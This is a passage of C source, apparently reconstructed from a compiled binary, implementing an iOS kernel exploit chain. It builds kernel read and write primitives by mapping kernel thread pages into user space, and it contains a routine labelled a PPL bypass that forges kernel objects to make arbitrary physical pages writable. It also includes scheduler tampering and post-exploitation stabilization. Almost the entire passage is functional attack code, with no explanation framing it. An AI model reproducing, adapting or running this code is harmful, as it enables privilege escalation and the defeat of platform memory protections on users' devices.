    ws->thread_kva = thread_kva;
    ws->pthread_val = (uint64_t)worker;

    uint64_t thread_pa = kva_to_pa(thread_kva);
    if (!thread_pa) {
        kwlog("[krw] FAIL: thread kva_to_pa\n");
        ws->exit_flag = 1; __ulock_wake(0x1, &ws->ulock_word, 0);
        pthread_join(worker, NULL); free(ws); return -8;
    }
    ws->thread_pa = thread_pa;

    vm_address_t mapped = 0;
    kern_return_t kr = vm_map(mach_task_self_, &mapped, vm_page_size, 0,
            VM_FLAGS_ANYWHERE, entry_port, thread_pa & ~page_mask,
            FALSE, VM_PROT_READ | VM_PROT_WRITE,
            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_SHARE);
    if (kr) {
        kwlog("[krw] FAIL: map thread page 0x%x\n", kr);
        ws->exit_flag = 1; __ulock_wake(0x1, &ws->ulock_word, 0);
        pthread_join(worker, NULL); free(ws); return -9;
    }
    ws->mapped_base = mapped;
    ws->map_size = vm_page_size;
    ws->mapped_thread = (page_mask & thread_kva) + mapped;
    uint64_t mapped_thread = ws->mapped_thread;
    kwlog("[krw] mapped thread at 0x%llx (page 0x%llx)\n",
            (unsigned long long)mapped_thread, (unsigned long long)mapped);

    uint64_t kc_base = kt_kva - 0x32997D0;
    uint64_t kern_mh = kc_base + 0x8000;
    uint64_t text_base = 0, text_size = 0;
    if (find_kernel_text_section(kern_mh, &text_base, &text_size) || !text_base) {
        kwlog("[krw] FAIL: __TEXT_EXEC,__text not found\n");
        ws->exit_flag = 1; __ulock_wake(0x1, &ws->ulock_word, 0);
        pthread_join(worker, NULL); free(ws); return -10;
    }
    uint64_t pattern_addr = scan_text_for_pattern(text_base, text_size, 0x52800BE8, 1);
    if (!pattern_addr) {
        kwlog("[krw] FAIL: MOV W8,#0x5F not found\n");
        ws->exit_flag = 1; __ulock_wake(0x1, &ws->ulock_word, 0);
        pthread_join(worker, NULL); free(ws); return -11;
    }
    uint32_t instr_m8 = kern_read32(pattern_addr - 8);
    uint16_t displacement = (uint16_t)(instr_m8 >> 5);
    if (displacement < 1 || displacement > 0xBFF) {
        kwlog("[krw] FAIL: invalid displacement %u\n", displacement);
        ws->exit_flag = 1; __ulock_wake(0x1, &ws->ulock_word, 0);
        pthread_join(worker, NULL); free(ws); return -12;
    }
    ws->displacement = displacement;
    kwlog("[krw] displacement = %u (0x%x)\n", displacement, displacement);

    uint32_t off_write = 536;
    uint32_t off_sched1 = 380;
    uint32_t off_sched2 = 460;
    uint32_t off_flag = 404;

    uint64_t proc_pattern = scan_text_for_pattern(text_base, text_size, 0xF833D914, 0);
    uint64_t processor_addr = 0;
    if (!proc_pattern) {
        kwlog("[krw] WARN: processor pattern 0xF833D914 not found in __text\n");
    } else {
        kwlog("[krw] processor pattern at 0x%llx\n", (unsigned long long)proc_pattern);
        uint64_t proc_array = resolve_adrp_ref(proc_pattern - 8);
        if (proc_array) {
            kwlog("[krw] processor array at 0x%llx\n", (unsigned long long)proc_array);
            int ncpu = sysconf(_SC_NPROCESSORS_ONLN);
            uint32_t stride = 8;
            for (int i = 0; i < ncpu; i++) {
                uint64_t proc_ptr = 0;
                kwrite_kread64(proc_array + (uint64_t)stride * i, &proc_ptr);
                if (!proc_ptr || proc_ptr < 0xFFFFFE0000000000ULL) continue;
                uint64_t proc_struct = 0;
                kwrite_kread64(proc_ptr + 40, &proc_struct);
                if (!proc_struct || proc_struct < 0xFFFFFE0000000000ULL) continue;
                uint64_t state_val = 0;
                kwrite_kread64(proc_struct + 2220, &state_val);
                uint32_t state = (uint32_t)state_val;
                kwlog("[krw] cpu%d: proc=0x%llx state=%u\n", i,
                        (unsigned long long)proc_ptr, state);
                if (state == 2 && !processor_addr)
                    processor_addr = proc_ptr;
            }
        }
    }

    if (!processor_addr) {
        kwlog("[krw] WARN: no processor with state==2 found\n");
    } else {
        kwlog("[krw] using processor 0x%llx\n", (unsigned long long)processor_addr);
        uint64_t existing = *(uint64_t *)(mapped_thread + off_write);
        kwlog("[krw] thread+%u existing = 0x%llx\n", off_write, (unsigned long long)existing);
        if (existing != 0 && existing < 0xFFFFFE0000000000ULL) {
            kwlog("[krw] ERR: thread+%u non-zero non-kptr\n", off_write);
        } else {
            *(uint64_t *)(mapped_thread + off_write) = processor_addr;
            kwlog("[krw] wrote proc addr to thread+%u\n", off_write);
            uint32_t s1 = *(uint32_t *)(mapped_thread + off_sched1);
            uint32_t s2 = *(uint32_t *)(mapped_thread + off_sched2);
            kwlog("[krw] sched: thread+%u=%u thread+%u=%u\n", off_sched1, s1, off_sched2, s2);
            if (s1 <= 3 && s2 <= 0xB71B00) {
                *(uint32_t *)(mapped_thread + off_sched1) = 1;
                *(uint32_t *)(mapped_thread + off_sched2) = 12000000;
            }
            uint16_t fl = *(uint16_t *)(mapped_thread + off_flag);
            kwlog("[krw] flag: thread+%u=%u\n", off_flag, fl);
            if (fl <= 0x7F)
                *(uint16_t *)(mapped_thread + off_flag) = 96;
            kwlog("[krw] execute_complex_processor_operation OK\n");
        }
    }

    g_krw_state = ws;
    g_sptm_entry_port = entry_port;

    uint32_t v34 = displacement + 96;
    kwlog("[krw] thread+%u (v30=144) = 0x%llx\n", 144,
            (unsigned long long)*(uint64_t *)(mapped_thread + 144));
    kwlog("[krw] thread+%u (disp+96) = 0x%llx\n", v34,
            (unsigned long long)*(uint64_t *)(mapped_thread + v34));
    kwlog("[krw] thread+%u (disp+96+24) = 0x%llx\n", v34 + 24,
            (unsigned long long)*(uint64_t *)(mapped_thread + v34 + 24));

    uint64_t proc_kva = kread_get_our_proc();
    if (proc_kva) {
        uint64_t v1 = 0, v2 = 0;
        kwrite_kread64(proc_kva, &v1);
        kr = kread_via_thread_state_impl(proc_kva, &v2, 8);
        kwlog("[krw] kread verify: vm_region=0x%llx ts=0x%llx match=%d\n",
                (unsigned long long)v1, (unsigned long long)v2, v1 == v2);
    }

    kwlog("[krw] === INIT_KERNEL_RW_PRIMITIVES COMPLETE ===\n");
    return 0;
}

#pragma mark - init_necp_kernel_handle (binary sub_25804, required for PTE writes)

typedef struct {
    uint64_t mapped_base;
    uint64_t map_size;
    uint64_t pthread_val;
    uint32_t mach_port;
    uint32_t page_offset;
} pte_thread_state_t;

static pte_thread_state_t *g_pte_state = NULL;

static void *pte_thread_noop(void *arg) {
    (void)arg;
    return NULL;
}

int init_necp_kernel_handle(mach_port_t entry_port) {
    kwlog("[necp_handle] === INIT_NECP_KERNEL_HANDLE ===\n");

    uint64_t page_mask = kwrite_get_page_mask();
    if (!page_mask) return -1;

    pte_thread_state_t *ps = (pte_thread_state_t *)calloc(1, 0x20);
    if (!ps) { kwlog("[necp_handle] FAIL: calloc\n"); return -2; }

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);

    pthread_t thread;
    extern int pthread_create_suspended_np(pthread_t *, const pthread_attr_t *,
            void *(*)(void *), void *);
    int ret = pthread_create_suspended_np(&thread, &attr, pte_thread_noop, NULL);
    pthread_attr_destroy(&attr);
    if (ret) {
        kwlog("[necp_handle] FAIL: pthread_create_suspended_np %d\n", ret);
        free(ps);
        return -3;
    }

    mach_port_t port = pthread_mach_thread_np(thread);
    kwlog("[necp_handle] suspended thread port=0x%x\n", port);

    uint64_t thread_kva = resolve_thread_kva(port);
    if (!thread_kva) {
        kwlog("[necp_handle] FAIL: resolve_thread_kva\n");
        thread_resume(port);
        pthread_join(thread, NULL);
        free(ps);
        return -4;
    }
    kwlog("[necp_handle] thread KVA = 0x%llx\n", (unsigned long long)thread_kva);

    uint32_t offset = 184;
    kwlog("[necp_handle] using offset=%u (thread+%u)\n", offset, offset);

    uint64_t thread_field = 0;
    kread_via_thread_state_impl(thread_kva + offset, &thread_field, 8);
    kwlog("[necp_handle] thread+%u = 0x%llx\n", offset,
            (unsigned long long)thread_field);

    uint64_t field_pa = kva_to_pa(thread_field);
    if (!field_pa) {
        kwlog("[necp_handle] FAIL: kva_to_pa(0x%llx)=0\n",
                (unsigned long long)thread_field);
        thread_resume(port);
        pthread_join(thread, NULL);
        free(ps);
        return -5;
    }
    kwlog("[necp_handle] field PA = 0x%llx\n", (unsigned long long)field_pa);

    vm_address_t mapped = 0;
    kern_return_t kr = vm_map(mach_task_self_, &mapped, vm_page_size, 0,
            VM_FLAGS_ANYWHERE, entry_port, field_pa & ~page_mask,
            FALSE, VM_PROT_READ | VM_PROT_WRITE,
            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_SHARE);
    if (kr) {
        kwlog("[necp_handle] FAIL: vm_map 0x%x\n", kr);
        thread_resume(port);
        pthread_join(thread, NULL);
        free(ps);
        return -6;
    }

    ps->mapped_base = mapped;
    ps->map_size = vm_page_size;
    ps->pthread_val = (uint64_t)thread;
    ps->mach_port = port;
    ps->page_offset = (uint32_t)(page_mask & field_pa);

    g_pte_state = ps;

    uint64_t *mapped_field = (uint64_t *)(mapped + ps->page_offset);
    kwlog("[necp_handle] mapped_field=%p val=0x%llx\n",
            mapped_field, (unsigned long long)*mapped_field);
    kwlog("[necp_handle] === INIT_NECP_KERNEL_HANDLE COMPLETE ===\n");
    return 0;
}

#pragma mark - STABILIZATION teardown: primitive teardown (called from stabilize.m)

void necp_handle_teardown(void) {
    pte_thread_state_t *ps = g_pte_state;
    if (!ps) { kwlog("[stab] necp PTE handle: not initialized -- skip\n"); return; }
    g_pte_state = NULL;
    if (ps->mach_port)   thread_resume(ps->mach_port);
    if (ps->pthread_val) pthread_join((pthread_t)ps->pthread_val, NULL);
    if (ps->mapped_base) vm_deallocate(mach_task_self_, (vm_address_t)ps->mapped_base, ps->map_size);
    free(ps);
    kwlog("[stab] necp PTE handle torn down (noop thread resumed+joined, kernel-page mapping freed)\n");
}

void krw_primitives_teardown(void) {
    krw_worker_state_t *ws = g_krw_state;
    if (!ws) { kwlog("[stab] krw worker: not initialized -- skip\n"); return; }
    g_krw_state = NULL;
    ws->exit_flag = 1;
    __ulock_wake(0x1, &ws->ulock_word, 0);
    if (ws->pthread_val) pthread_join((pthread_t)ws->pthread_val, NULL);
    if (ws->mapped_base) vm_deallocate(mach_task_self_, (vm_address_t)ws->mapped_base, ws->map_size);
    free(ws);
    kwlog("[stab] krw worker torn down (worker stopped+joined, mapped thread page freed)\n");
}

void port_persistence_balance(void) {
    for (int i = 0; i < g_stab_ioref_cnt; i++) {
        uint64_t kva = g_stab_iorefs[i].ipc_port_kva;
        if (!kva) continue;
        if (g_stab_iorefs[i].bumped4) {
            uint32_t cur = 0;
            if (kwrite_kread32(kva + 4, &cur) == KERN_SUCCESS && cur >= 1 && cur <= 0x80000000u) {
                uint32_t nv = cur - 1;
                int wr = kwrite_via_necp_object(kva + 4, &nv, 4, 1);
                kwlog("[stab] ioref[%d] port+4: %u -> %u (necp wr=%d)\n", i, cur, nv, wr);
            } else kwlog("[stab] ioref[%d] port+4=0x%x implausible -> skip\n", i, cur);
        }
        if (g_stab_iorefs[i].bumped128) {
            uint32_t cur = 0;
            if (kwrite_kread32(kva + 128, &cur) == KERN_SUCCESS && cur >= 1 && cur <= 0x80000000u) {
                uint32_t nv = cur - 1;
                int wr = kwrite_via_necp_object(kva + 128, &nv, 4, 1);
                kwlog("[stab] ioref[%d] port+128: %u -> %u (necp wr=%d)\n", i, cur, nv, wr);
            } else kwlog("[stab] ioref[%d] port+128=0x%x implausible -> skip\n", i, cur);
        }
    }
    struct { uint64_t addr; uint64_t size; int32_t fmt; } di = {0};
    mach_msg_type_number_t dc = 5;
    if (task_info(mach_task_self_, 17, (task_info_t)&di, &dc) == KERN_SUCCESS && di.addr) {
        *(uint32_t *)(di.addr + 256) = 0;
        *(uint32_t *)(di.addr + 260) = 0;
        kwlog("[stab] cleared dyld special-port slots 0/1 (all_image_info 0x%llx)\n", (unsigned long long)di.addr);
    } else {
        kwlog("[stab] dyld special-port slot clear: task_info failed -- skip\n");
    }
}

void hijack_teardown(void) {
    if (g_hijack_mapped_addr) {
        vm_deallocate(mach_task_self_, g_hijack_mapped_addr, vm_page_size);
        kwlog("[stab] hijack: freed thread-page mapping 0x%llx\n", (unsigned long long)g_hijack_mapped_addr);
    } else {
        kwlog("[stab] hijack: no mapping (not initialized) -- skip\n");
    }
    g_hijack_mapped_addr = 0;
    g_hijack_kfunc_ptr = NULL;
    g_hijack_thread_port = 0;
}

static kern_return_t kread_via_pte_thread(uint64_t kaddr, void *out, uint32_t size) {
    pte_thread_state_t *ps = g_pte_state;
    if (!ps || !size) return KERN_FAILURE;

    uint64_t page_mask = kwrite_get_page_mask();
    uint32_t page_size = (uint32_t)(page_mask + 1);
    uint64_t bytes_read = 0;

    while (bytes_read < size) {
        uint64_t cur = kaddr + bytes_read;
        uint64_t remaining = size - bytes_read;

        uint64_t pg_off = page_mask & cur;
        uint64_t pg_base = cur & ~page_mask;
        if (pg_off >= page_size - 528)
            pg_off = page_size - 528;
        uint64_t adjusted = pg_off + pg_base;

        uint64_t *field_ptr = (uint64_t *)(ps->mapped_base + ps->page_offset);
        uint64_t saved = *field_ptr;
        __asm__ volatile("dsb ish" ::: "memory");

        *field_ptr = adjusted - 16;

        mach_msg_type_number_t state_count = 132;
        uint32_t state[132];
        kern_return_t kr = thread_get_state(ps->mach_port, 17,
                (thread_state_t)state, &state_count);

        *field_ptr = saved;

        if (kr || state_count != 132) return kr ? kr : KERN_FAILURE;

        size_t chunk = adjusted - cur + 528;
        if (chunk > remaining) chunk = remaining;
        memcpy((uint8_t *)out + bytes_read, (char *)state + (cur - adjusted), chunk);
        bytes_read += chunk;
    }
    return KERN_SUCCESS;
}

#pragma mark - kwrite_via_necp_object (binary sub_28F90, kernel data write primitive)

static kern_return_t vm_map_shared_region_impl(vm_address_t *addr_out,
        vm_size_t size, uint64_t pa) {
    uint64_t page_mask = kwrite_get_page_mask();
    *addr_out = 0;
    kern_return_t kr = vm_map(mach_task_self_, addr_out, size, 0,
            VM_FLAGS_ANYWHERE, g_sptm_entry_port, pa & ~page_mask,
            FALSE, VM_PROT_READ | VM_PROT_WRITE,
            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_SHARE);
    if (kr) return kr | 0x80000000;
    return 0;
}

int kwrite_via_necp_object(uint64_t target_addr, const void *data,
        uint32_t size, int use_fd) {
    krw_worker_state_t *ws = g_krw_state;
    if (!ws) {
        kwlog("[necp_kw] FAIL: no worker state\n");
        return 708609;
    }

    uint64_t page_mask = kwrite_get_page_mask();

    if (target_addr + 0x1000000000000ULL >= 0xFFFFFFFFEFFFULL) {
        kwlog("[necp_kw] FAIL: not a kernel addr 0x%llx\n",
                (unsigned long long)target_addr);
        return 708609;
    }

    int fd = -1;
    if (use_fd) {
        fd = open("/dev/null", O_NONBLOCK);
        if (fd < 0) {
            int err = *__error();
            if (err < 0) err = -err;
            return err | 0x40000000;
        }
    }

    if (!size) {
        if (fd != -1) close(fd);
        return 0;
    }

    const uint32_t v30 = 144;

    uint32_t v19 = 0;
    int result = 0;

    while (v19 < size) {
        uint64_t v20 = size - v19;
        int32_t v59 = 0;
        uint64_t v21 = target_addr + v19;

        uint32_t v23;
        uint32_t v22 = v19;
        if (v20 >= 4) {
            v23 = 0;
        } else {
            if (((v21 + (uint32_t)v20 - 1) ^ (v21 + 3)) & ~page_mask)
                v23 = 4 - (uint32_t)v20;
            else
                v23 = 0;
        }

        uint64_t v24 = v21 - v23;

        kern_return_t kr = kread_via_thread_state_impl(v24, &v59, 4);
        if (kr) {
            kwlog("[necp_kw] kread FAIL at 0x%llx: 0x%x\n",
                    (unsigned long long)v24, kr);
            result = kr;
            goto done;
        }

        size_t v26;
        if (4 - (uint64_t)v23 >= v20)
            v26 = size - v19;
        else
            v26 = 4 - v23;

        int32_t v27 = v59;
        memcpy((char *)&v59 + v23, (const uint8_t *)data + v22, v26);
        int32_t v28 = v59;
        uint32_t v58 = v23;

        if (v27 == v59)
            goto advance;

        {
            uint64_t v66 = v24;
            vm_address_t address = 0;
            vm_size_t v29 = vm_page_size;
            vm_size_t v52 = v29;

            uint32_t v32 = ws->displacement;
            uint64_t v33_unused = ws->thread_pa;
            uint64_t mapped_thread = ws->mapped_thread;
            if (!v32 || !mapped_thread) {
                kwlog("[necp_kw] FAIL: no displacement or mapped_thread\n");
                result = 708609;
                goto done;
            }

            uint32_t v34 = v32 + 96;
            uint64_t *v36 = (uint64_t *)(mapped_thread + v34);

            int v37 = 11;

            while (1) {
                if (v37 != 11)
                    thread_switch(ws->mach_port, 2, 10);

                uint64_t v64 = *v36;

                if ((v64 & 7) || v64 + 0x1000000000000ULL >= 0xFFFFFFFFEFFFULL) {
                    if (!--v37) {
                        result = 163878;
                        v29 = v52;
                        goto label_66;
                    }
                    continue;
                }

                uint64_t v38 = *(uint64_t *)(mapped_thread + v30);
                uint64_t v63 = v38;

                if (v38 == v64) {
                    uint64_t obj_pa = kva_to_pa(v38);
                    v29 = v52;
                    if (!obj_pa) {
                        kwlog("[necp_kw] FAIL: kva_to_pa(0x%llx)=0\n",
                                (unsigned long long)v38);
                        result = 163878;
                        goto label_66;
                    }

                    uint64_t v41 = obj_pa;

                    result = vm_map_shared_region_impl(&address, v52, obj_pa);
                    if (result) {
                        kwlog("[necp_kw] FAIL: vm_map_shared 0x%x\n", result);
                        goto label_66;
                    }

                    vm_address_t v42 = (page_mask & v64) + address;

                    int32_t state52 = *(int32_t *)(v42 + 52);
                    if (state52 != 1) {
                        kwlog("[necp_kw] state52=%d != 1\n", state52);
                        result = 163857;
                        goto label_66;
                    }

                    int32_t type_val;
                    if (v28) {
                        *(int32_t *)(v42 + 52) = v28 + 1;
                        type_val = 1;
                    } else {
                        type_val = 2;
                    }
                    *(int32_t *)(v42 + 56) = type_val;
                    v36[3] = v24;

                    uint64_t v46 = ws->counter;

                    int wake_ret = __ulock_wake(0x1, &ws->ulock_word, 0);
                    if (wake_ret) {
                        int err = *__error();
                        if (err < 0) err = -err;
                        result = err | 0x40000000;
                        kwlog("[necp_kw] ulock_wake err=%d\n", err);
                    } else if (v46 == ws->counter) {
                        uint32_t v48 = 0;
                        while (v48 != 1001) {
                            uint32_t v49 = v48 + 1;
                            thread_switch(ws->mach_port, 2, v48 > 8 ? 1 : 0);
                            result = 0;
                            v48 = v49;
                            v29 = v52;
                            if (v46 != ws->counter)
                                goto label_66;
                        }
                        result = 4097;
                        kwlog("[necp_kw] timeout waiting for counter\n");
                    } else {
                        result = 0;
                    }

                    goto label_66;
                }

                if (!--v37) {
                    result = 163878;
                    v29 = v52;
                    goto label_66;
                }
            }

        label_66:
            if (address && v29)
                vm_deallocate(mach_task_self_, address, v29);
            if (result)
                goto done;
        }

    advance:
        v19 = v19 - v58 + 4;
    }

    result = 0;
done:
    if (fd != -1) close(fd);
    return result;
}

#pragma mark - get_kernel_va_base_by_version (binary 0x35A50)

static uint64_t get_kernel_va_base(int *out_shift) {
    *out_shift = 6;
    return 0xFFFFFFDC00000000ULL;
}

#pragma mark - kwrite_ptr (binary 0x288A4)

static int kwrite_ptr_impl(uint64_t kaddr, uint64_t value) {
    uint64_t v = value;
    return kwrite_via_necp_object(kaddr, &v, 8, 1) ? 0 : 1;
}

static int kwrite32_impl(uint64_t kaddr, uint32_t value) {
    uint32_t v = value;
    return kwrite_via_necp_object(kaddr, &v, 4, 1) ? 0 : 1;
}

#pragma mark - kern_port_kobj_find (binary 0x37210, kernel object allocator)

uint64_t kern_port_kobj_find_impl(uint32_t min_size, uint32_t *out_size,
        mach_port_t *out_port) {
    *out_size = 0;
    *out_port = 0;

    mach_port_t port_recv = 0, port_notify = 0;
    if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port_recv) ||
        mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port_notify)) {
        kwlog("[kobj_find] port_allocate failed\n");
        return 0;
    }

    uint64_t recv_ipc_port = resolve_port_to_ipc_port(port_recv);
    if (!recv_ipc_port) {
        kwlog("[kobj_find] resolve port_recv failed\n");
        mach_port_mod_refs(mach_task_self_, port_recv, MACH_PORT_RIGHT_RECEIVE, -1);
        mach_port_mod_refs(mach_task_self_, port_notify, MACH_PORT_RIGHT_RECEIVE, -1);
        return 0;
    }
    uint64_t v27 = recv_ipc_port + 96;
    kwlog("[kobj_find] recv_ipc=0x%llx v27=0x%llx\n",
            (unsigned long long)recv_ipc_port, (unsigned long long)v27);

    uint64_t result_addr = 0;
    uint32_t result_size = 0;
    mach_port_t previous = 0;

    for (int attempt = 0; attempt < 64; attempt++) {
        kern_return_t kr = mach_port_request_notification(mach_task_self_,
                port_recv, 72, 0,
                port_notify, MACH_MSG_TYPE_MAKE_SEND_ONCE, &previous);
        if (kr) { kwlog("[kobj_find] notify1 failed: 0x%x\n", kr); break; }

        kr = mach_port_request_notification(mach_task_self_,
                port_recv, 72, 0,
                MACH_PORT_NULL, MACH_MSG_TYPE_MAKE_SEND_ONCE, &previous);
        if (kr) { kwlog("[kobj_find] notify2 failed: 0x%x\n", kr); break; }

        if (previous + 1 >= 2) {
            mach_port_deallocate(mach_task_self_, previous);
            previous = 0;
        }

        uint64_t raw = 0;
        kwrite_kread64(v27, &raw);
        if (!raw) continue;

        uint64_t decoded;
        if ((raw >> 38) & 1) {
            decoded = (raw & 0xFFFFFFFFFFFFFFE0ULL) | 0x4000000000ULL;
        } else {
            decoded = (raw & 0xFFFFFFBFFFFFC000ULL) | 0x4000000000ULL;
        }
        decoded |= 0xFFFFFF8000000000ULL;

        if ((decoded & 7) || decoded + 0x1000000000000ULL >= 0xFFFFFFFFEFFFULL) {
            if (attempt == 0)
                kwlog("[kobj_find] raw=0x%llx decoded=0x%llx (invalid)\n",
                        (unsigned long long)raw, (unsigned long long)decoded);
            continue;
        }

        uint32_t obj_size;
        if ((raw >> 38) & 1) {
            obj_size = (uint32_t)(((raw & 0x10) | 0x20) << (raw & 0xF));
        } else {
            obj_size = (uint32_t)((raw << 14) & 0xFFFC000);
        }

        if (obj_size >= min_size) {
            result_addr = decoded;
            result_size = obj_size;
            break;
        }

        uint32_t zero = 0;
        kwrite_via_necp_object(decoded + 8, &zero, 4, 1);
    }

    if (result_addr) {
        kwrite_ptr_impl(v27, 0);
        *out_size = result_size;
        *out_port = port_recv;
        kwlog("[kobj_find] SUCCESS: addr=0x%llx size=%u (need %u)\n",
                (unsigned long long)result_addr, result_size, min_size);
    } else {
        kwlog("[kobj_find] FAILED after all attempts\n");
        mach_port_mod_refs(mach_task_self_, port_recv, MACH_PORT_RIGHT_RECEIVE, -1);
        mach_port_mod_refs(mach_task_self_, port_notify, MACH_PORT_RIGHT_RECEIVE, -1);
    }

    return result_addr;
}

#pragma mark - kern_obj_pool (binary ctx+680, cache of up to 8 kernel objects)

static pthread_mutex_t g_kobj_pool_mtx = PTHREAD_MUTEX_INITIALIZER;
static struct { uint64_t addr; uint32_t size; } g_kobj_pool[8];
static uint32_t g_kobj_pool_idx = 0;

static void kern_obj_pool_return_impl(uint64_t addr, uint32_t size) {
    if (pthread_mutex_lock(&g_kobj_pool_mtx)) return;
    uint32_t idx = g_kobj_pool_idx;
    if (idx <= 7) {
        for (uint32_t i = idx; i < 8; i++) {
            if (!g_kobj_pool[i].addr) {
                g_kobj_pool[i].addr = addr;
                g_kobj_pool[i].size = size;
                g_kobj_pool_idx = idx;
                pthread_mutex_unlock(&g_kobj_pool_mtx);
                return;
            }
        }
    }
    pthread_mutex_unlock(&g_kobj_pool_mtx);
}

static uint64_t kern_obj_pool_get(uint32_t *out_size) {
    if (pthread_mutex_lock(&g_kobj_pool_mtx)) return 0;
    uint32_t idx = g_kobj_pool_idx;
    uint64_t addr = 0;
    if (idx <= 7 && g_kobj_pool[idx].addr && g_kobj_pool[idx].size) {
        addr = g_kobj_pool[idx].addr;
        *out_size = g_kobj_pool[idx].size;
        g_kobj_pool[idx].addr = 0;
        g_kobj_pool[idx].size = 0;
        if (idx > 0) g_kobj_pool_idx = idx - 1;
    }
    pthread_mutex_unlock(&g_kobj_pool_mtx);
    return addr;
}

#pragma mark - ppl_make_writable_page (binary 0x38870, THE PPL BYPASS)

int ppl_make_writable_page(uint64_t target_pa, ppl_page_t *out) {
    memset(out, 0, sizeof(ppl_page_t));

    vm_address_t address = 0;
    vm_size_t size = vm_page_size;
    mach_port_t entry_port = 0;
    uint64_t kobj_addr = 0;
    uint32_t kobj_size = 0;
    uint64_t page_mask = kwrite_get_page_mask();

    kern_return_t kr = mach_make_memory_entry(mach_task_self_,
            &size, 0, 131075, &entry_port, 0);
    if (kr) {
        kwlog("[ppl] mach_make_memory_entry failed: 0x%x\n", kr);
        return kr | 0x80000000;
    }

    uint64_t ipc_port_kva = resolve_port_to_ipc_port(entry_port);
    if (!ipc_port_kva) {
        kwlog("[ppl] resolve_port_to_ipc_port failed\n");
        goto fail_cleanup;
    }
    uint64_t kobject = ipc_port_get_kobject(ipc_port_kva);
    if (!kobject) {
        kwlog("[ppl] ipc_port_get_kobject failed\n");
        goto fail_cleanup;
    }

    uint64_t deep_obj = ipc_object_resolve_deep(kobject);
    if (!deep_obj) {
        kwlog("[ppl] ipc_object_resolve_deep failed\n");
        goto fail_cleanup;
    }

    mach_port_t kobj_entry = 0;
    kobj_addr = kern_obj_pool_get(&kobj_size);
    if (!kobj_addr) {
        kobj_size = 64;
        kobj_addr = kern_port_kobj_find_impl(64, &kobj_size, &kobj_entry);
        if (!kobj_addr) {
            kwlog("[ppl] kern_port_kobj_find failed\n");
            goto fail_cleanup;
        }
    }

    {
        int shift = 0;
        uint64_t va_base = get_kernel_va_base(&shift);
        if (!va_base) {
            kwlog("[ppl] get_kernel_va_base failed\n");
            goto fail_cleanup;
        }

        uint8_t fake[64];
        memset(fake, 0, 64);
        uint32_t page_idx = (uint32_t)((deep_obj - va_base) >> shift);
        uint32_t op_flag = 0x2000000;
        uint32_t type_val = 320;
        uint32_t target_page = (uint32_t)(target_pa / vm_page_size);

        memcpy(fake + 32, &page_idx, 4);
        memcpy(fake + 36, &op_flag, 4);
        memcpy(fake + 44, &type_val, 4);
        memcpy(fake + 48, &target_page, 4);

        int wr = kwrite_via_necp_object(kobj_addr, fake, 64, 1);
        if (wr) {
            kwlog("[ppl] kwrite fake struct failed: %d\n", wr);
            goto fail_cleanup;
        }
    }

    kr = vm_map(mach_task_self_, &address, size, 0,
            VM_FLAGS_ANYWHERE, entry_port, 0, FALSE,
            VM_PROT_READ | VM_PROT_WRITE,
            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_COPY);
    if (kr) {
        kwlog("[ppl] vm_map failed: 0x%x\n", kr);
        goto fail_cleanup;
    }

    *(uint32_t *)address = 0;
    kr = vm_protect(mach_task_self_, address, size, FALSE, VM_PROT_NONE);
    if (kr) {
        kwlog("[ppl] vm_protect(NONE) failed: 0x%x\n", kr);
        goto fail_cleanup;
    }
    kr = vm_protect(mach_task_self_, address, size, FALSE,
            VM_PROT_READ | VM_PROT_WRITE);
    if (kr) {
        kwlog("[ppl] vm_protect(RW) failed: 0x%x\n", kr);
        goto fail_cleanup;
    }

    if (!kwrite_ptr_impl(deep_obj + 32, kobj_addr)) {
        kwlog("[ppl] kwrite_ptr failed\n");
        goto fail_cleanup;
    }

    out->mapped_addr = address;
    out->map_size = size;
    out->kobj_addr = kobj_addr;
    out->kobj_size = kobj_size;
    out->ref_count = 1;
    out->entry_port = entry_port;
    kwlog("[ppl] mapped PA=0x%llx -> user 0x%llx (kobj=0x%llx)\n",
            (unsigned long long)target_pa,
            (unsigned long long)address,
            (unsigned long long)kobj_addr);
    return 0;

fail_cleanup:
    if (address && size)
        vm_deallocate(mach_task_self_, address, size);
    if (entry_port + 1 >= 2)
        mach_port_deallocate(mach_task_self_, entry_port);
    if (kobj_addr && kobj_size)
        kern_obj_pool_return_impl(kobj_addr, kobj_size);
    return -1;
}

#pragma mark - ppl_writable_page_free (binary 0x38BCC)

void ppl_writable_page_free(ppl_page_t *page) {
    if (!page) return;
    uint64_t kobj = page->kobj_addr;
    if (kobj && page->mapped_addr) {
        kwrite32_impl(kobj, 0xFFFFFFFF);
        vm_deallocate(mach_task_self_, page->mapped_addr,
                page->map_size * page->ref_count);
        mach_port_deallocate(mach_task_self_, page->entry_port);
        kern_obj_pool_return_impl(kobj, page->kobj_size);
    }
    memset(page, 0, sizeof(ppl_page_t));
}

#pragma mark - PPL read/write dispatch (binary 0x38E00 / 0x38EEC)
